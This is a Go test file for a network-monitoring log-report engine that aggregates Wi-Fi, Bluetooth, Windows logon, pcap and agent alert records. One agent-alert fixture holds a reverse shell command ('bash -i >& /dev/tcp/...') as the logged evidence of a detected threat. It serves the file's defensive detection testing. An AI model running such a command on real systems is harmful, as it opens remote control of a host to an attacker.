package logreport

import (
	"context"
	"encoding/json"
	"testing"
	"time"

	"gopkg.in/mcuadros/go-syslog.v2/format"
)

type mockStore struct {
	data    map[string]map[string][]byte
	nodes   []NodeSummary
	locs    map[string]string
	vendors map[string]string
}

func newMockStore() *mockStore {
	return &mockStore{
		data:    make(map[string]map[string][]byte),
		locs:    make(map[string]string),
		vendors: make(map[string]string),
	}
}

func (m *mockStore) GetLogReportData(_ context.Context, kind, id string) ([]byte, error) {
	if k, ok := m.data[kind]; ok {
		if b, ok := k[id]; ok {
			return b, nil
		}
	}
	return nil, nil
}

func (m *mockStore) ListLogReportData(_ context.Context, kind string) (map[string][]byte, error) {
	ret := make(map[string][]byte)
	if k, ok := m.data[kind]; ok {
		for id, b := range k {
			ret[id] = b
		}
	}
	return ret, nil
}

func (m *mockStore) SaveLogReportData(_ context.Context, kind string, items map[string][]byte) error {
	k, ok := m.data[kind]
	if !ok {
		k = make(map[string][]byte)
		m.data[kind] = k
	}
	for id, b := range items {
		k[id] = b
	}
	return nil
}

func (m *mockStore) DeleteLogReportData(_ context.Context, kind string, ids []string) error {
	if k, ok := m.data[kind]; ok {
		for _, id := range ids {
			delete(k, id)
		}
	}
	return nil
}

func (m *mockStore) ResetLogReportData(_ context.Context, kind string) error {
	if kind == "" {
		m.data = make(map[string]map[string][]byte)
	} else {
		delete(m.data, kind)
	}
	return nil
}

func (m *mockStore) FindVendor(mac string) string {
	if v, ok := m.vendors[mac]; ok {
		return v
	}
	return "MockVendor"
}

func (m *mockStore) GetLoc(ip string) string {
	if l, ok := m.locs[ip]; ok {
		return l
	}
	return ""
}

func (m *mockStore) LookupNode(ip string) NodeSummary {
	for _, n := range m.nodes {
		if n.Name == ip || n.ID == ip {
			return n
		}
	}
	return NodeSummary{Name: ip}
}

func (m *mockStore) ListNodes(_ context.Context) ([]NodeSummary, error) {
	return m.nodes, nil
}

func (m *mockStore) UpdateSensor(host, sensorType, param string, count int64) {}

func (m *mockStore) CheckSensorMonitor(host, sensorType, param string, cpu, mem, load, txSpeed, rxSpeed float64, sent, recv, proc int64) {}

func (m *mockStore) GetRetentionConfig(_ context.Context) (int, int) {
	return 30, 10000
}

func rec(tag, content string, ts int64) Record {
	return Record{Time: ts, Host: "host1", Tag: tag, Content: content, Severity: 6}
}

func load[T any](t *testing.T, st ReportStore, kind string) map[string]*T {
	t.Helper()
	m, err := st.ListLogReportData(context.Background(), kind)
	if err != nil {
		t.Fatal(err)
	}
	ret := map[string]*T{}
	for id, b := range m {
		e := new(T)
		if err := json.Unmarshal(b, e); err != nil {
			t.Fatal(err)
		}
		ret[id] = e
	}
	return ret
}

func TestParseRecord(t *testing.T) {
	r, ok := ParseRecord(`{"hostname":"h","tag":"twWifiScan","content":"type=APInfo","severity":5}`, "src", 10)
	if !ok || r.Host != "h" || r.Tag != "twWifiScan" || r.Content != "type=APInfo" || r.Severity != 5 || r.Time != 10 {
		t.Fatalf("unexpected %+v ok=%v", r, ok)
	}
	// RFC5424 style: app_name / message, host from src
	r, ok = ParseRecord(`{"app_name":"twpcap","message":"type=DNS"}`, "1.2.3.4", 1)
	if !ok || r.Host != "1.2.3.4" || r.Tag != "twpcap" || r.Content != "type=DNS" {
		t.Fatalf("unexpected %+v ok=%v", r, ok)
	}
	if _, ok := ParseRecord(`not json`, "", 0); ok {
		t.Fatal("invalid json must fail")
	}
	if _, ok := ParseRecord(`{"hostname":"h"}`, "", 0); ok {
		t.Fatal("record without tag must fail")
	}
}

func TestProcessIgnoresOtherTag(t *testing.T) {
	st := newMockStore()
	s := NewSession(context.Background(), st)
	if s.Process(SourceWifiScan, rec("twpcap", "type=APInfo,bssid=aa:bb:cc:dd:ee:ff", 1)) {
		t.Fatal("tag mismatch must be ignored")
	}
	if s.Process(SourceWifiScan, rec("twWifiScan", "type=Stats", 1)) {
		t.Fatal("unsupported type must be ignored")
	}
	if s.Processed != 0 {
		t.Fatalf("processed=%d", s.Processed)
	}
}

func TestWifiAP(t *testing.T) {
	st := newMockStore()
	ctx := context.Background()
	s := NewSession(ctx, st)
	c := "type=APInfo,ssid=net,bssid=aa:bb:cc:dd:ee:ff,rssi=-50,Channel=1,info=wpa"
	s.Process(SourceWifiScan, rec("twWifiScan", c, 100))
	if err := s.Commit(); err != nil {
		t.Fatal(err)
	}
	s = NewSession(ctx, st)
	s.Process(SourceWifiScan, rec("twWifiScan", "type=APInfo,ssid=net2,bssid=aa:bb:cc:dd:ee:ff,rssi=-60,Channel=1,info=wpa", 200))
	if err := s.Commit(); err != nil {
		t.Fatal(err)
	}
	aps := load[WifiAPEnt](t, st, KindWifiAP)
	if len(aps) != 1 {
		t.Fatalf("aps=%d", len(aps))
	}
	ap := aps["host1:aa:bb:cc:dd:ee:ff"]
	if ap == nil || ap.Count != 2 || ap.Change != 1 || ap.SSID != "net2" || ap.FirstTime != 100 || ap.LastTime != 200 || len(ap.RSSI) != 2 {
		t.Fatalf("unexpected ap %+v", ap)
	}
}

func TestRSSILimit(t *testing.T) {
	st := newMockStore()
	s := NewSession(context.Background(), st)
	for i := 0; i < MaxSeriesSize+10; i++ {
		s.Process(SourceWifiScan, rec("twWifiScan", "type=APInfo,bssid=aa,rssi=-1,Channel=1", int64(i+1)))
	}
	if err := s.Commit(); err != nil {
		t.Fatal(err)
	}
	for _, ap := range load[WifiAPEnt](t, st, KindWifiAP) {
		if len(ap.RSSI) != MaxSeriesSize || ap.Count != MaxSeriesSize+10 {
			t.Fatalf("rssi=%d count=%d", len(ap.RSSI), ap.Count)
		}
	}
}

func TestBlue(t *testing.T) {
	st := newMockStore()
	s := NewSession(context.Background(), st)
	lt := "2024-02-06T06:13:49+09:00"
	s.Process(SourceBlueScan, rec("twBlueScan", "type=Device,address=d7:bb,name=n,rssi=-64,addrType=Public,vendor=V,info=i,ft="+lt+",lt="+lt, 1))
	s.Process(SourceBlueScan, rec("twBlueScan", "type=OMRONEnv,address=e1,name=env,rssi=-60,temp=23.5,hum=40,lx=10,press=1000,sound=30,eTVOC=1,eCO2=400", 2))
	s.Process(SourceBlueScan, rec("twBlueScan", "type=SwitchBotEnv,address=e2,name=sb,rssi=-60,temp=20,hum=50,bat=90,co2=500", 3))
	s.Process(SourceBlueScan, rec("twBlueScan", "type=SwitchBotPlugMini,address=p1,name=plug,rssi=-70,sw=true,over=false,load=125", 4))
	s.Process(SourceBlueScan, rec("twBlueScan", "type=SwitchBotMotionSensor,address=m1,name=,rssi=-64,moving=true,event=report,lastMoveDiff=5,lastMove="+lt+",battery=100,light=false", 5))
	if s.Process(SourceBlueScan, rec("twBlueScan", "type=SwitchBotPlugMini,address=p2,rssi=-70", 6)) {
		t.Fatal("plug without load must be ignored")
	}
	if err := s.Commit(); err != nil {
		t.Fatal(err)
	}
	if s.Processed != 5 {
		t.Fatalf("processed=%d", s.Processed)
	}
	devs := load[BlueDeviceEnt](t, st, KindBlueDevice)
	if len(devs) != 1 {
		t.Fatal("device")
	}
	for _, d := range devs {
		if d.Address != "d7:bb" || d.Vendor != "V" || d.AddressType != "Public" || d.RSSI[0].Value != -64 {
			t.Fatalf("%+v", d)
		}
		if d.FirstTime != time.Date(2024, 2, 5, 21, 13, 49, 0, time.UTC).UnixNano() {
			t.Fatalf("first=%d", d.FirstTime)
		}
	}
	envs := load[EnvMonitorEnt](t, st, KindEnvMonitor)
	if len(envs) != 2 {
		t.Fatalf("env=%d", len(envs))
	}
	for _, e := range envs {
		switch e.Address {
		case "e1":
			if e.EnvData[0].Temp != 23.5 || e.EnvData[0].ECo2 != 400 || e.EnvData[0].Illuminance != 10 {
				t.Fatalf("%+v", e.EnvData[0])
			}
		case "e2":
			if e.EnvData[0].Battery != 90 || e.EnvData[0].ECo2 != 500 {
				t.Fatalf("%+v", e.EnvData[0])
			}
		}
	}
	for _, p := range load[PowerMonitorEnt](t, st, KindPowerMonitor) {
		if p.Data[0].Load != 12.5 || !p.Data[0].Switch || p.Data[0].Over {
			t.Fatalf("%+v", p.Data[0])
		}
	}
	for _, m := range load[MotionSensorEnt](t, st, KindMotionSensor) {
		if !m.Data[0].Moving || m.Data[0].Battery != 100 || m.Data[0].LastMove == 0 {
			t.Fatalf("%+v", m.Data[0])
		}
	}
}

func TestWinLogonAndScore(t *testing.T) {
	st := newMockStore()
	s := NewSession(context.Background(), st)
	tm := "2021-08-19T05:17:43+09:00"
	s.Process(SourceWinLog, rec("twwinlog", "type=Logon,subject=@,target=bob@PC,computer=PC,ip=1.1.1.1,logonType=Network,time="+tm, 1))
	s.Process(SourceWinLog, rec("twwinlog", "type=Logon,subject=@,target=bob@PC,computer=PC,ip=1.1.1.1,logonType=Network,time="+tm, 2))
	s.Process(SourceWinLog, rec("twwinlog", "type=LogonFailed,subject=@,target=bob@PC,computer=PC,ip=1.1.1.1,logonType=Network,failedCode=BadPassword,time="+tm, 3))
	s.Process(SourceWinLog, rec("twwinlog", "type=Logoff,subject=@,target=bob@PC,computer=PC,ip=,logonType=Network,time="+tm, 4))
	s.Process(SourceWinLog, rec("twwinlog", "type=Logon,subject=@,target=eve@PC,computer=PC,ip=2.2.2.2,logonType=Network,time="+tm, 5))
	if err := s.Commit(); err != nil {
		t.Fatal(err)
	}
	logons := load[WinLogonEnt](t, st, KindWinLogon)
	if len(logons) != 2 {
		t.Fatalf("logons=%d", len(logons))
	}
	var bob, eve *WinLogonEnt
	for _, l := range logons {
		if l.Target == "bob@PC" {
			bob = l
		} else {
			eve = l
		}
	}
	if bob.Count != 3 || bob.Logon != 2 || bob.Failed != 1 || bob.Logoff != 1 || bob.FailedCode["BadPassword"] != 1 || bob.LogonType["Network"] != 2 {
		t.Fatalf("bob %+v", bob)
	}
	// penalty = 1 + 10*1/3 = 4
	if bob.Penalty != 4 || eve.Penalty != 0 || !bob.ValidScore || !eve.ValidScore {
		t.Fatalf("penalty bob=%d eve=%d", bob.Penalty, eve.Penalty)
	}
	if !(bob.Score < 50 && eve.Score > 50) {
		t.Fatalf("score bob=%f eve=%f", bob.Score, eve.Score)
	}
}

func TestPcap(t *testing.T) {
	st := newMockStore()
	st.nodes = append(st.nodes, NodeSummary{ID: "n1", Name: "192.168.1.1"})
	ctx := context.Background()
	s := NewSession(ctx, st)
	lt := "2021-08-19T05:17:43+09:00"
	s.Process(SourcePcap, rec("twpcap", "type=EtherType,0x0800=100,0x1234=1", 1))
	s.Process(SourcePcap, rec("twpcap", "type=EtherType,0x0800=50", 2))
	s.Process(SourcePcap, rec("twpcap", "type=DNS,DNSType=A,Name=example.com,sv=8.8.8.8,count=5,change=1,lcl=1.1.1.1,lMAC=aa,ft="+lt+",lt="+lt, 1))
	s.Process(SourcePcap, rec("twpcap", "type=RADIUS,cl=192.168.1.1,sv=10.0.0.1,count=3,req=3,accept=1,reject=2,challenge=0,ft="+lt+",lt="+lt, 1))
	s.Process(SourcePcap, rec("twpcap", "type=TLSFlow,cl=192.168.1.1,sv=9.9.9.9,serv=HTTPS,count=2,maxver=TLS1.2,cipher=X,ft="+lt+",lt="+lt, 1))
	s.Process(SourcePcap, rec("twpcap", "type=IPToMAC,mac=aa,ip=1.1.1.1", 1)) // not handled
	if err := s.Commit(); err != nil {
		t.Fatal(err)
	}
	if s.Processed != 5 {
		t.Fatalf("processed=%d", s.Processed)
	}
	ethers := load[EtherTypeEnt](t, st, KindEtherType)
	if e := ethers["host1:0x0800"]; e == nil || e.Count != 150 || e.Name != "IPv4" {
		t.Fatalf("%+v", e)
	}
	if e := ethers["host1:0x1234"]; e == nil || e.Name != "Other(0x1234)" {
		t.Fatalf("%+v", e)
	}
	for _, d := range load[DNSQEnt](t, st, KindDNSQ) {
		if d.Count != 5 || d.Name != "example.com" || d.Server != "8.8.8.8" || d.LastClient != "1.1.1.1" {
			t.Fatalf("%+v", d)
		}
	}
}

func TestSourceHelpers(t *testing.T) {
	for _, s := range []string{SourceWifiScan, SourceBlueScan, SourcePcap, SourceWinLog, SourceTwAgent} {
		if !IsSource(s) || SyslogTag(s) == "" || len(KindsOf(s)) == 0 {
			t.Fatalf("source %s", s)
		}
	}
	if IsSource("syslog") || IsKind("nope") || !IsKind(KindWinTask) {
		t.Fatal("helper mismatch")
	}
}

func TestEngine_ProcessSyslog(t *testing.T) {
	store := newMockStore()

	engine := NewEngine(store,
		WithFlushInterval(50*time.Millisecond),
		WithCleanInterval(10*time.Minute),
	)

	ctx, cancel := context.WithCancel(context.Background())
	defer cancel()

	if err := engine.Start(ctx); err != nil {
		t.Fatalf("engine.Start failed: %v", err)
	}

	now := time.Now()
	// 1. Wi-Fi
	engine.ProcessSyslog(map[string]interface{}{
		"tag":       "twWifiScan",
		"hostname":  "ap-scanner",
		"content":   "type=APInfo,ssid=TestSSID1,bssid=00:11:22:33:44:55,rssi=-50,Channel=1,info=wpa2",
		"timestamp": now,
	})

	// 2. BlueScan
	engine.ProcessSyslog(map[string]interface{}{
		"tag":       "twBlueScan",
		"hostname":  "blue-scanner",
		"content":   "type=Device,address=aa:bb:cc:dd:ee:ff,name=BLEBeacon,rssi=-65",
		"timestamp": now,
	})

	// 3. Pcap
	engine.ProcessSyslog(map[string]interface{}{
		"tag":       "twpcap",
		"hostname":  "pcap-probe",
		"content":   "type=EtherType,0x0800=100",
		"timestamp": now,
	})

	// 4. WinLog
	engine.ProcessSyslog(map[string]interface{}{
		"tag":       "twwinlog",
		"hostname":  "DC01",
		"content":   "type=EventID,computer=DC01,eventID=4624,count=5",
		"timestamp": now,
	})

	// 5. twagentneo MQTT
	engine.ProcessMQTTMsg("agent-01", "10.0.0.55", "twsnmpneo/agent/agent-01/metrics", []byte(`{"agent_id":"agent-01","hostname":"agent-host-01","os":"linux","version":"v1.2.0","ip":"10.0.0.55","mac":"00:11:22:33:44:55","cpu_percent":35.5,"mem_percent":62.1,"disk_used_percent":48.0,"rx_mbps":10.2,"tx_mbps":3.4}`))
	engine.ProcessMQTTMsg("agent-01", "10.0.0.55", "twsnmpneo/agent/agent-01/alert", []byte(`{"timestamp":"2026-10-25T05:00:00Z","agent_id":"agent-01","hostname":"agent-host-01","level":"HIGH","category":"security","rule_title":"Reverse Shell","source_log":"bash -i >& /dev/tcp/198.51.100.10/4444","ai_judgment":{"is_threat":true,"confidence":0.96,"summary_ja":"リバースシェル検知","recommended_action_ja":"プロセス停止と隔離","compliance_violated":true,"compliance":["PCI-DSS","CIS"]}}`))
	engine.ProcessMQTTMsg("agent-01", "10.0.0.55", "twsnmpneo/agent/agent-01/fim", []byte(`{"timestamp":"2026-10-25T05:00:01Z","agent_id":"agent-01","hostname":"agent-host-01","level":"MEDIUM","category":"fim","rule_title":"FIM: WRITE /etc/passwd","source_log":"path=/etc/passwd op=WRITE hash=e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855"}`))
	engine.ProcessMQTTMsg("agent-01", "10.0.0.55", "twsnmpneo/agent/agent-01/sca", []byte(`{"timestamp":"2026-10-25T05:00:02Z","agent_id":"agent-01","hostname":"agent-host-01","rule_id":"CIS-3.14","title":"World-Writable File","severity":"high","file_path":"/etc/cron.d/job","proof":"Permissions: 0666","remediation":"chmod 0644 /etc/cron.d/job","compliance":["CIS","CIS-3.14"],"ai_judge":{"is_threat":true,"confidence":0.9,"summary_ja":"危険なパーミッション","action_ja":"パーミッション修正"}}`))
	engine.ProcessMQTTMsg("agent-01", "10.0.0.55", "twsnmpneo/agent/agent-01/tcp", []byte(`[{"remote_ip":"8.8.8.8","process":"curl","services":["https"],"count":2}]`))

	// 6. twagentneo RFC 5424 Syslog
	engine.ProcessSyslog(map[string]interface{}{
		"app_name":        "twagentneo",
		"hostname":        "agent-host-01",
		"structured_data": `[twsnmpneo@17862 rule="Brute Force SSH" threat="YES" comp="NO"]`,
		"message":         "AI Summary: SSH brute force attempt",
		"severity":        3,
		"timestamp":       now,
	})

	// 7. twagentneo SNMP Trap
	engine.ProcessTrap(map[string]interface{}{
		"Time":        now.UnixNano(),
		"FromAddress": "10.0.0.55(agent-host-01)",
		"TrapType":    "twagentNeoSCAAlert",
		"Variables":   "twagentNeoHostname.0=agent-host-01, twagentNeoTrapSeverity.0=HIGH, twagentNeoTrapCategory.0=Configuration Audit, twagentNeoTrapRuleTitle.0=CIS-4.1: SSH Root Login Enabled, twagentNeoTrapSourceLog.0=/etc/ssh/sshd_config",
	})

	engine.Flush()

	agentInfo, err := store.ListLogReportData(ctx, KindTwAgentInfo)
	if err != nil || len(agentInfo) != 1 {
		t.Fatalf("expected exactly 1 deduplicated twAgentInfo entity, got %d", len(agentInfo))
	}
	agentAlerts, err := store.ListLogReportData(ctx, KindTwAgentAlert)
	if err != nil || len(agentAlerts) < 2 {
		t.Fatalf("expected >= 2 twAgentAlert entities, got %d", len(agentAlerts))
	}
	agentFIM, err := store.ListLogReportData(ctx, KindTwAgentFIM)
	if err != nil || len(agentFIM) < 1 {
		t.Fatalf("expected >= 1 twAgentFIM entities, got %d", len(agentFIM))
	}
	agentSCA, err := store.ListLogReportData(ctx, KindTwAgentSCA)
	if err != nil || len(agentSCA) < 2 {
		t.Fatalf("expected >= 2 twAgentSCA entities, got %d", len(agentSCA))
	}
	agentTCP, err := store.ListLogReportData(ctx, KindTwAgentTCP)
	if err != nil || len(agentTCP) != 1 {
		t.Fatalf("expected 1 twAgentTCP entity, got %d", len(agentTCP))
	}

	engine.Stop()
}

func TestTwpcapSyslogParsing(t *testing.T) {
	// Test NormalizeKind and IsKind
	if !IsKind("dnsQ") || !IsKind("dnsq") {
		t.Fatalf("expected both dnsQ and dnsq to be recognized kinds")
	}
	if NormalizeKind("dnsQ") != KindDNSQ || NormalizeKind("dnsq") != KindDNSQ {
		t.Fatalf("expected NormalizeKind to return canonical KindDNSQ ('dnsq')")
	}

	msgs := [][]byte{
		[]byte("<174>2026-10-31T05:04:05-07:00 myhost twpcap: type=EtherType,0x0800=10,0x86dd=5\n"),
		[]byte("<174>2026-10-31T05:04:05-07:00 myhost twpcap: type=DNS,sv=8.8.8.8,DNSType=A,Name=example.com,count=5,change=1,lcl=1.1.1.1,lMAC=aa,ft=2026-10-31T05:00:00-07:00,lt=2026-10-31T05:04:00-07:00\n"),
		[]byte("<174>2026-10-31T05:04:05-07:00 myhost twpcap: type=RADIUS,cl=192.168.1.1,sv=10.0.0.1,count=3,req=3,accept=1,reject=2,challenge=0,ft=2026-10-31T05:00:00-07:00,lt=2026-10-31T05:04:00-07:00\n"),
		[]byte("<174>2026-10-31T05:04:05-07:00 myhost twpcap: type=TLSFlow,cl=192.168.1.1,sv=9.9.9.9,serv=HTTPS,count=2,maxver=TLS1.2,cipher=X,ft=2026-10-31T05:00:00-07:00,lt=2026-10-31T05:04:00-07:00\n"),
	}

	ctx := context.Background()
	store := newMockStore()
	engine := NewEngine(store)
	_ = engine.Start(ctx)

	f := &format.Automatic{}
	for _, raw := range msgs {
		p := f.GetParser(raw)
		if err := p.Parse(); err != nil {
			t.Fatalf("parse err: %v", err)
		}
		parts := p.Dump()
		engine.ProcessSyslog(parts)
	}

	engine.Flush()

	ethers, err := store.ListLogReportData(ctx, KindEtherType)
	if err != nil || len(ethers) != 2 {
		t.Fatalf("expected 2 ethers, got %d (err: %v)", len(ethers), err)
	}
	dns, err := store.ListLogReportData(ctx, KindDNSQ)
	if err != nil || len(dns) != 1 {
		t.Fatalf("expected 1 dns query, got %d (err: %v)", len(dns), err)
	}
	radius, err := store.ListLogReportData(ctx, KindRADIUSFlow)
	if err != nil || len(radius) != 1 {
		t.Fatalf("expected 1 radius flow, got %d (err: %v)", len(radius), err)
	}
	tls, err := store.ListLogReportData(ctx, KindTLSFlow)
	if err != nil || len(tls) != 1 {
		t.Fatalf("expected 1 tls flow, got %d (err: %v)", len(tls), err)
	}

	engine.Stop()
}
